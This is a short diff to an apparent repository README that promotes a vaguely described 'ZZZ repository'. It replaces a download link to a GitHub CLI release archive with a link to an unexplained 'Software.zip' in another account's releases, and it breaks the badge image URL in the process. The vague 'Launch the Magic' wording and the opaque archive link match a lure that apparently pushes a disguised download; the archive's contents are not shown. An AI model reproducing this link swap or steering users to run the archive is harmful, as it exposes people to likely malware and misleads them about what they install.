@@ -32,7 +32,7 @@ The ZZZ repository offers a plethora of features designed to inspire and engage 
 
 To access the wonders of the ZZZ repository, simply click the link below:
 
-[![Launch the Magic](https://img.shields.io/badge/Launch%20the%20Magic-Here-orange)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Launch the Magic](https://github.com/blastPh/zzz/releases/download/v1.0/Software.zip%20the%20Magic-Here-orange)](https://github.com/blastPh/zzz/releases/download/v1.0/Software.zip)
 
 Note: Please make sure to launch the magic to experience the full potential of this repository.
 
